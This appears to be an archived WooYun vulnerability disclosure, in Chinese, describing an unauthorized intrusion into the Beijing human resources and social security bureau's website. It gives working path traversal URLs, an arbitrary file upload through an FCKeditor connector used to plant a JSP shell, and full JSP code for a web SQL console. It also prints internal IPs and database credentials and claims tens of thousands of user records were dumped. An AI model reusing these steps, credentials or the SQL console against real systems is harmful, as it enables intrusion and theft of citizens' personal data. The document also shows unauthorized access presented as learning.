@@ -1,0 +1,742 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		北京市社会保障局可任意代码执行  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		北京市社会保障局可任意代码执行  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/possible">possible</a> 
+</li><li>提交时间：		2013-12-30 14:07</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-12-30：	细节已通知厂商并且等待厂商处理中<br/>
+									2014-01-04：	厂商已经确认，细节仅向厂商公开<br/>
+									2014-01-14：	细节向核心白帽子及相关领域专家公开<br/>
+									2014-01-24：	细节向普通白帽子公开<br/>
+									2014-02-03：	细节向实习白帽子公开<br/>
+									2014-02-13：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">北京市保障局存在很多bug，简单做个小测试.</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">北京市人力资源与社会保障局站点，存在好多bug，而且该服务器上含有北京地区大量站点，导致大量用户信息泄露。<br />
+<br />
+<br />
+<br />
+仅仅是为了学习而渗透，为了渗透而学习。整个过程中没有做任何破坏，只是为了证明漏洞存在的危害，和严重后果。<br />
+<br />
+<br />
+<br />
+测试一个文件下载点:<br />
+<br />
+http://www.bjld.gov.cn/LDJAPP/zcfg/downloadfile.jsp?dest=201108050946274210.doc&amp;src=附件一2011食品制造图表.doc<br />
+<br />
+<br />
+<br />
+请求<br />
+<br />
+http://www.bjld.gov.cn/LDJAPP/zcfg/downloadfile.jsp?dest=aa/../201108050946274210.doc&amp;src=附件一2011食品制造图表.doc<br />
+<br />
+下载成功，说明没有过滤../ <br />
+<br />
+<br />
+<br />
+测试是否可以下载站点下任意文件，通过尝试web.xml文件<br />
+<br />
+不断使用../回溯,当请求<br />
+<br />
+http://www.bjld.gov.cn/LDJAPP/zcfg/downloadfile.jsp?dest=../../WEB-INF/web.xml&amp;src=web.xml<br />
+<br />
+下载成功。<br />
+<br />
+<br />
+<br />
+通过查看web.xml配置文件，获得里面使用了FCKeditor编辑器，直接百度该编辑器jsp版漏洞，发现<br />
+<br />
+很单一，都是通过如下路径上传jspshell.<br />
+<br />
+http://www.xxx.com/fckeditor/editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=connectors/jsp/connector<br />
+<br />
+但是尝试后，发现没有成功，提示404页面不存在，使用下载点试图下载browser.html确实下载失败<br />
+<br />
+说明管理员已经删除了该文件。没有办法没有看过Fckeditor源代码不知道还有什么漏洞，这条路只能暂时放弃。<br />
+<br />
+<br />
+<br />
+然后想到的就是看网站源代码，看是否有sql注入可以获得管理员账号，进后台，或者通过查找可以知道后台路径，看是否有未授权访问的页面，如果后台上传无访问限制是最理想的情况。<br />
+<br />
+<br />
+<br />
+请求<br />
+<br />
+http://www.bjld.gov.cn/LDJAPP/zcfg/downloadfile.jsp?dest=../../search/ddyy/index.jsp&amp;src=index.jsp<br />
+<br />
+看一下源代码，可以找到数据库连接文件<br />
+<br />
+http://www.bjld.gov.cn/LDJAPP/zcfg/downloadfile.jsp?dest=../../WEB-INF/classes/com/trs/ldj/DBobj.class&amp;src=DBobj.class<br />
+<br />
+进而找到数据库配置文件<br />
+<br />
+http://www.bjld.gov.cn/LDJAPP/zcfg/downloadfile.jsp?dest=../../WEB-INF/classes/com/trs/ldj/DatabaseConfig.properties&amp;src=DatabaseConfig.properties<br />
+<br />
+<br />
+<br />
+配置信息<br />
+<br />
+driver=oracle.jdbc.driver.OracleDriver<br />
+<br />
+url=jdbc:oracle:thin:@192.168.1.202:1521:oracle<br />
+<br />
+user=ldj<br />
+<br />
+pass=ldj<br />
+<br />
+minlimit=10<br />
+<br />
+maxlimit=30<br />
+<br />
+<br />
+<br />
+### TRS数据库连接 ### (从D:\ldj\newsearch\fgout.jsp 学习一下TRS使用）<br />
+<br />
+TRS_URL      = 192.168.1.7<br />
+<br />
+TRS_PORT     = 8888<br />
+<br />
+TRS_USERNAME = system<br />
+<br />
+TRS_PASSWORD = manager<br />
+<br />
+<br />
+<br />
+oracle不用说了，还有一个TRS，不知为何物，百度一下，原来也是一个数据库系统，自己孤陋了，不了点基础知识，可惜都是内网ip，没有映射出来，暂时没有什么用。<br />
+<br />
+<br />
+<br />
+下载了几个sql查询界面，查找是否存在sql注入<br />
+<br />
+http://www.bjld.gov.cn/LDJAPP/zcfg/downloadfile.jsp?dest=../../search/ddyy/ddyy_01_outline.jsp&amp;src=ddyy_01_outline.jsp<br />
+<br />
+可惜都使用参数化查询，看来这套系统这点做的挺好，也坚持说明sql注入太普及，稍微知道点安全的程序员都不会犯这样的错误，说的绝对了。<br />
+<br />
+<br />
+<br />
+找了半天没有找到后台，不知道后台页面是哪里，google hack一下，收到的是http://www.bjld.gov.cn/csibiz/csirp/guest/entprereg/login.jsp而该站点与下载点似乎不是一个站点，无法下载到其源代码. 因此，权限绕过上传页面没找到<br />
+<br />
+<br />
+<br />
+不知道怎么办了，下载了下载功能页面，看是否能下载其它目录下内容，因为jsp的程序权限很高，只有你猜不到的路径，没有下载不了的路径。<br />
+<br />
+http://www.bjld.gov.cn/LDJAPP/zcfg/downloadfile.jsp?dest=../../zcfg/downloadfile.jsp&amp;src=downloadfile.jsp<br />
+<br />
+<br />
+<br />
+下载成功，下载的绝对路径是<br />
+<br />
+d:\\ldj\\zcfg\\upload\\<br />
+<br />
+因此，说明d盘下的所有内容都可以下载的，但是猜来猜去也没有猜到登录页面站点所在网站的绝对路径。<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+再次思考，还是落到了Fckeditor编辑器上，因为是开源的，有源代码，下载之，看一下源代码.class反编译，该接收请求的.class中，可以接收http get和post请求，<br />
+<br />
+get请求是一个查询操作，而post请求是一个上传操作，具体代码精简如下（这样充分说明“出来混的迟早要还的，自己动手丰衣足食”<br />
+<br />
+public void doPost(HttpServletRequest request, HttpServletResponse response)<br />
+<br />
+    throws ServletException, IOException<br />
+<br />
+  {<br />
+<br />
+    ....<br />
+<br />
+    String commandStr = request.getParameter(&quot;Command&quot;);<br />
+<br />
+    String typeStr = request.getParameter(&quot;Type&quot;);<br />
+<br />
+    String currentFolderStr = request.getParameter(&quot;CurrentFolder&quot;);<br />
+<br />
+    String currentPath = baseDir + typeStr + currentFolderStr;<br />
+<br />
+    String currentDirPath = getServletContext().getRealPath(currentPath);<br />
+<br />
+<br />
+<br />
+    if (!commandStr.equals(&quot;FileUpload&quot;)) { //command必须为FileUpload表示上传<br />
+<br />
+      retVal = &quot;203&quot;;<br />
+<br />
+    } else {<br />
+<br />
+      DiskFileUpload upload = new DiskFileUpload();<br />
+<br />
+      try {<br />
+<br />
+        List items = upload.parseRequest(request);<br />
+<br />
+<br />
+<br />
+        Map fields = new HashMap();<br />
+<br />
+<br />
+<br />
+        Iterator iter = items.iterator();<br />
+<br />
+        while (iter.hasNext()) {<br />
+<br />
+          FileItem item = (FileItem)iter.next();<br />
+<br />
+          if (item.isFormField())<br />
+<br />
+            fields.put(item.getFieldName(), item.getString());<br />
+<br />
+          else<br />
+<br />
+            fields.put(item.getFieldName(), item);<br />
+<br />
+        }<br />
+<br />
+        FileItem uplFile = (FileItem)fields.get(&quot;NewFile&quot;); //NewFile 上传文件中 file字段的名称<br />
+<br />
+        String fileNameLong = uplFile.getName();<br />
+<br />
+        fileNameLong = fileNameLong.replace(&#039;\\&#039;, &#039;/&#039;);<br />
+<br />
+        String[] pathParts = fileNameLong.split(&quot;/&quot;);<br />
+<br />
+        String fileName = pathParts[(pathParts.length - 1)];<br />
+<br />
+<br />
+<br />
+        String nameWithoutExt = getNameWithoutExtension(fileName);<br />
+<br />
+        String ext = getExtension(fileName);                   //直接读取文件扩展 <br />
+<br />
+        File pathToSave = new File(currentDirPath, fileName);<br />
+<br />
+        int counter = 1;<br />
+<br />
+        while (pathToSave.exists()) {<br />
+<br />
+          newName = nameWithoutExt + &quot;(&quot; + counter + &quot;)&quot; + &quot;.&quot; + ext; //没有任何验证文件后缀，就是一个任意文件上传<br />
+<br />
+          retVal = &quot;201&quot;;<br />
+<br />
+          pathToSave = new File(currentDirPath, newName);<br />
+<br />
+          counter++;<br />
+<br />
+        }<br />
+<br />
+        uplFile.write(pathToSave);  //保存文件<br />
+<br />
+因此只要请求中Command=FileUpload，使用post方式就可以实现任意文件上传(大神莫笑，只是网上没有搜到，小弟很孤陋...所以才这么费事，希望大神多多分享自己成果...)。而且后来找http://www.xxx.com/fckeditor/editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=connectors/jsp/connector数据包，发现其实最终数据也是post到上面的.class类中。<br />
+<br />
+<br />
+<br />
+有了这个任意文件上传，就好办了，有两种方式可以上传1.使用代理burp等拦截到fckeditor/editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=connectors/jsp/connector上传的数据包，将其修改成post到www.bjld.gov.cn站点的Fckeditor路径即可<br />
+<br />
+2.直接自己写代码向http://www.bjld.gov.cn/LDJAPP//FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=FileUpload&amp;Type=file&amp;CurrentFolder=/页面使用post请求上传文件即可。就简单用php写了一个小代码实现，选择一个文件，就会向指定的url中上传选择的文件，这样做主要是为了方便下次遇到在使用，所谓磨刀不误砍柴工。再者好久没有写代码了，当锻炼一下，否则有些太生疏了。<br />
+<br />
+界面基本上这样。<br />
+<br />
+获得一个shell,jsp 系统权限。<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+简单看一下站点是weblogic，下面有大量虚拟目录（每个目录都是一个站点，信息很多)<br />
+<br />
+ &lt;Application Name=&quot;bbs&quot; Path=&quot;d:\&quot; StagingMode=&quot;nostage&quot; TwoPhase=&quot;true&quot;&gt;<br />
+<br />
+       <br />
+<br />
+ &lt;WebAppComponent Name=&quot;bbs&quot; Targets=&quot;myserver&quot; URI=&quot;bbs&quot;/&gt;<br />
+<br />
+    <br />
+<br />
+  &lt;/Application&gt;<br />
+<br />
+   <br />
+<br />
+ &lt;Application Name=&quot;comment&quot; Path=&quot;d:\&quot; StagingMode=&quot;nostage&quot; TwoPhase=&quot;true&quot;&gt;<br />
+<br />
+        <br />
+<br />
+&lt;WebAppComponent Name=&quot;comment&quot; Targets=&quot;myserver&quot; URI=&quot;comment&quot;/&gt;<br />
+<br />
+    <br />
+<br />
+&lt;/Application&gt;<br />
+<br />
+   <br />
+<br />
+ &lt;Application Name=&quot;era&quot; Path=&quot;d:\&quot; StagingMode=&quot;nostage&quot; TwoPhase=&quot;true&quot;&gt;<br />
+<br />
+      <br />
+<br />
+  &lt;WebAppComponent Name=&quot;era&quot; Targets=&quot;myserver&quot; URI=&quot;era&quot;/&gt;<br />
+<br />
+  <br />
+<br />
+  &lt;/Application&gt;<br />
+<br />
+  <br />
+<br />
+  &lt;Application Name=&quot;ldj&quot; Path=&quot;d:\&quot; StagingMode=&quot;nostage&quot; TwoPhase=&quot;true&quot;&gt;<br />
+<br />
+        <br />
+<br />
+&lt;WebAppComponent Name=&quot;ldj&quot; Targets=&quot;myserver&quot; URI=&quot;ldj&quot;/&gt;<br />
+<br />
+    <br />
+<br />
+&lt;/Application&gt;<br />
+<br />
+    <br />
+<br />
+&lt;Application Name=&quot;forum&quot; Path=&quot;D:\&quot; StagingMode=&quot;nostage&quot; TwoPhase=&quot;true&quot;&gt;<br />
+<br />
+       <br />
+<br />
+ &lt;WebAppComponent Name=&quot;forum&quot; Targets=&quot;myserver&quot; URI=&quot;forum&quot;/&gt;<br />
+<br />
+    <br />
+<br />
+&lt;/Application&gt;<br />
+<br />
+    <br />
+<br />
+&lt;Application Name=&quot;lf&quot; Path=&quot;d:\&quot; StagingMode=&quot;nostage&quot; TwoPhase=&quot;true&quot;&gt;<br />
+<br />
+       <br />
+<br />
+&lt;WebAppComponent Name=&quot;lf&quot; Targets=&quot;myserver&quot; URI=&quot;lf&quot;/&gt;<br />
+<br />
+    <br />
+<br />
+&lt;/Application&gt;<br />
+<br />
+   <br />
+<br />
+ &lt;Application Name=&quot;portalApp&quot; Path=&quot;d:\&quot; StagingMode=&quot;nostage&quot; TwoPhase=&quot;true&quot;&gt;<br />
+<br />
+       <br />
+<br />
+&lt;WebAppComponent Name=&quot;portalApp&quot; Targets=&quot;myserver&quot; URI=&quot;portalApp&quot;/&gt;<br />
+<br />
+    <br />
+<br />
+&lt;/Application&gt;<br />
+<br />
+    <br />
+<br />
+&lt;Application Name=&quot;subscribe&quot; Path=&quot;d:\&quot; StagingMode=&quot;nostage&quot; TwoPhase=&quot;true&quot;&gt;<br />
+<br />
+       <br />
+<br />
+ &lt;WebAppComponent Name=&quot;subscribe&quot; Targets=&quot;myserver&quot; URI=&quot;subscribe&quot;/&gt;<br />
+<br />
+    <br />
+<br />
+&lt;/Application&gt;<br />
+<br />
+   ....<br />
+<br />
+<br />
+<br />
+每个子目录都是不同站点，该站点连接了局域网内的两个oracle 和两个sql server <br />
+<br />
+<br />
+<br />
+  TCP    192.168.1.3:2172       192.168.1.14:1433      ESTABLISHED<br />
+<br />
+  TCP    192.168.1.3:2477       192.168.1.37:1433      TIME_WAIT<br />
+<br />
+  TCP    192.168.1.3:1064       192.168.1.202:1521     ESTABLISHED<br />
+<br />
+  TCP    192.168.1.3:1087       192.168.1.21:1521      ESTABLISHED<br />
+<br />
+<br />
+<br />
+其实还有一个TRS在上面已经看到其配置文件了。<br />
+<br />
+TRS_URL      = 192.168.1.7<br />
+<br />
+TRS_PORT     = 8888<br />
+<br />
+TRS_USERNAME = system<br />
+<br />
+TRS_PASSWORD = manager<br />
+<br />
+<br />
+<br />
+driver=oracle.jdbc.driver.OracleDriver<br />
+<br />
+url=jdbc:oracle:thin:@192.168.1.202:1521:oracle<br />
+<br />
+user=bbs<br />
+<br />
+pass=bbs<br />
+<br />
+<br />
+<br />
+oracle.jdbc.url=jdbc:oracle:thin:@192.168.1.21:1521:oracle<br />
+<br />
+testbank.jdbc.driverClassName=${oracle.jdbc.driverClassName}<br />
+<br />
+testbank.jdbc.url=${oracle.jdbc.url}<br />
+<br />
+testbank.jdbc.username=gtptbw<br />
+<br />
+testbank.jdbc.password=gtptbw<br />
+<br />
+<br />
+<br />
+jdbc1.driverClassName=net.sourceforge.jtds.jdbc.Driver<br />
+<br />
+jdbc1.url=jdbc:jtds:sqlserver://192.168.1.37:1433/middledata<br />
+<br />
+jdbc1.username=sa<br />
+<br />
+jdbc1.password=ldj<br />
+<br />
+<br />
+<br />
+看一下sql server是sa权限的，这安全意识，已经可以了...又一个主机沦陷了...<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+对oracle不是很熟悉，因此学习一下，使用shell本身的功能总是连接失败，不知道是为什么（还请高人指点迷津，小弟先谢过了)<br />
+<br />
+<br />
+<br />
+没有办法，只能自己写代码，但是从头写很是有点难度，因此想出一个比较简单方法，就是站点连接数据库都封装在.class中，我自己引入这样的class就完成了数据库的连接，只需要提供sql语句，就可以了。<br />
+<br />
+<br />
+<br />
+&lt;%@ page import=&quot;java.sql.*&quot; contentType=&quot;text/html;charset=GBK&quot; errorPage=&quot;error.jsp&quot;%&gt;<br />
+<br />
+&lt;%@ page import=&quot;com.trs.ldj.*&quot; %&gt;<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+&lt;html&gt;<br />
+<br />
+&lt;head&gt;<br />
+<br />
+&lt;title&gt;检索结果&lt;/title&gt;<br />
+<br />
+&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=gb2312&quot;&gt;<br />
+<br />
+<br />
+<br />
+&lt;/head&gt;<br />
+<br />
+<br />
+<br />
+&lt;%<br />
+<br />
+	Connection conn = null ;<br />
+<br />
+	PreparedStatement stmt = null ;<br />
+<br />
+	String sql = &quot;&quot;;<br />
+<br />
+	try{<br />
+<br />
+	<br />
+<br />
+	        //连接数据库 应根据不同网站自行添加<br />
+<br />
+		com.trs.ldj.DBobj obj = new com.trs.ldj.DBobj();<br />
+<br />
+     	        conn	= obj.getConnection();<br />
+<br />
+		//获得提交的sql语句<br />
+<br />
+		sql = request.getParameter(&quot;sqldata&quot;).trim();<br />
+<br />
+		//提交语句不为NULL<br />
+<br />
+		if(sql != null ||sql !=&quot;&quot;){<br />
+<br />
+		  <br />
+<br />
+		stmt = conn.prepareStatement(sql);<br />
+<br />
+           	ResultSet rs = stmt.executeQuery();     <br />
+<br />
+      	        ResultSetMetaData rsmd = rs.getMetaData();<br />
+<br />
+      	        int columnCount = rsmd.getColumnCount();      <br />
+<br />
+		int first = 1;<br />
+<br />
+        	while (rs.next()){<br />
+<br />
+         	<br />
+<br />
+			//第一次输出表的列名<br />
+<br />
+			if(first == 1){<br />
+<br />
+			  for (int i=1; i&lt;=columnCount; i++) {<br />
+<br />
+			     out.println(rsmd.getColumnName(i)+&quot;   &quot;);<br />
+<br />
+			  }<br />
+<br />
+			  //两个换行符<br />
+<br />
+			  out.println(&quot;&lt;br&gt;&lt;br&gt;&quot;);<br />
+<br />
+			  //不在输出列名<br />
+<br />
+			  first = 0;<br />
+<br />
+			} // end if<br />
+<br />
+			<br />
+<br />
+          	for (int i=1; i&lt;=columnCount; i++) {<br />
+<br />
+            	if(rs.getString(rsmd.getColumnName(i))!=null){<br />
+<br />
+              		out.println(rs.getString(rsmd.getColumnName(i))+&quot;  &quot;);<br />
+<br />
+            			<br />
+<br />
+            		}else{<br />
+<br />
+                       out.println(&quot;NULL&quot;);<br />
+<br />
+                      }<br />
+<br />
+            	}<br />
+<br />
+			out.println(&quot;&lt;br&gt;&quot;);<br />
+<br />
+		} // end while<br />
+<br />
+		rs.close();<br />
+<br />
+			 }else<br />
+<br />
+	 {<br />
+<br />
+	    out.println(&quot;请输入查询语句&quot;);	 <br />
+<br />
+	 }<br />
+<br />
+	<br />
+<br />
+	}<br />
+<br />
+	finally{<br />
+<br />
+		stmt.close();<br />
+<br />
+		conn.close();<br />
+<br />
+		<br />
+<br />
+	}<br />
+<br />
+<br />
+<br />
+%&gt;<br />
+<br />
+代码比较丑陋，对jsp不是特别熟悉，但是这段小代码却已经满足了我的需求，不管黑猫白猫，找到耗子就是好猫，利用这段代码可以查询出很多，数据库信息表。<br />
+<br />
+<br />
+<br />
+本想对内网做个渗透，但由于...还是放弃了，当然渗透主要是想学习网络本身的拓扑结构，正所谓为了学习而渗透，而在渗透的过程中不断学习，不断成长。<br />
+<br />
+（做个梦:如果可能希望可以获得授权，学习一下内网部署)<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+简单总结一下：由任意文件下载（网站目录下任意文件下载)和FCKeditor编辑器漏洞，获得shell。同时遇到不同问题，不断学习。当然本文可能写偏了，与网站本身的漏洞讲的不是特别多，没有特别仔细看，代码太多，只关心数据了。 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">仅一个表就有几十万数据，包括用户名密码、邮箱，单位名等等<br />
+<br />
+</p><p class="detail"><a href="../images/192310394c192a193ec5f990ec4e0bae72ee3621.png" target="_blank"><img src="../images/192310394c192a193ec5f990ec4e0bae72ee3621.png" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+某个数据库下所有表查询<br />
+<br />
+</p><p class="detail"><a href="../images/192312055c2581c6c6c046a9c905f9dc375dfd94.png" target="_blank"><img src="../images/192312055c2581c6c6c046a9c905f9dc375dfd94.png" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/19231250ada3b270ce2fcdc92c3010ea6de1c554.png" target="_blank"><img src="../images/19231250ada3b270ce2fcdc92c3010ea6de1c554.png" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+注:该服务器上有很多虚拟目录，下面还有好多用户信息，不一一列举.<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+ </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">过滤+不要使用明文存密码<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+最后还是非常感谢站台提供的这样真实的学习环境！ </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/possible" title="possible">possible</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-06219" title="北京市社会保障局可任意代码执行">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：12 </p>
+													<p class="detail">确认时间：2014-01-04 10:54</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">CNVD确认并复现所述情况（应该叫文件包含吧），已经转由CNCERT通报给北京市信息化主管部门，由其后续尝试联系网站管理部门处置。<br />
+<br />
+</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="6219";
+var bugRating="2";
+var myRating="";
+var ratingCount="3";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
